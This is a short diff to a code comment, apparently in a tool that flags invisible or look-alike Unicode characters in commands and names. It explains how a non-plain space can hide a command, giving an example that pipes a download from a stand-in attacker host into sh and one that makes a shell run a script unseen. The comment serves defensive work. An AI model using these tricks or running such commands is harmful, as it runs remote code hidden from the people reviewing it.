@@ -24,8 +24,8 @@
  * - a variation selector after nothing that takes it: after ASCII, a space, or another selector.
  *
  * A space other than a plain one (no-break U+00A0, narrow U+202F, full width U+3000, thin and the
- * rest of Unicode's spaces) shows as a space, in a command's monospace as wide as a plain one or
- * wider. A shell splits words only at a plain space, a tab or a newline, so it takes one of these as
+ * rest of Unicode's spaces) shows as a space (the Ogham space mark, U+1680, as a dash), in a
+ * command's monospace as wide as a plain one or wider. A shell splits words only at a plain space, a tab or a newline, so it takes one of these as
  * part of a word: `echo done⟨U+00A0⟩# ; curl -s https://evil.example/x | sh` reads as a comment
  * but runs curl (a `#` starts a comment only at the start of a word), and
  * `LC_ALL=C⟨U+00A0⟩cat ./setup.sh` runs ./setup.sh (cat becomes part of the variable). So
@@ -48,7 +48,8 @@
  * - an emoji, whole, with the invisible characters it is made of (EMOJI): its style (VS15 or VS16),
  *   a keycap, a skin tone, the joiners between its pictures, the tags of the flags of England,
  *   Scotland and Wales;
- * - a private-use character, such as Apple's logo (U+F8FF): it shows as a glyph or a box.
+ * - a private-use character, such as Apple's logo (U+F8FF), but the two above: it shows as a glyph
+ *   or a box.
  *
  * A command, a path, a name, a rule or a tool's input (the default) writes out every other joiner
  * and variation selector: there one makes two names look alike, and a run of them carries what no
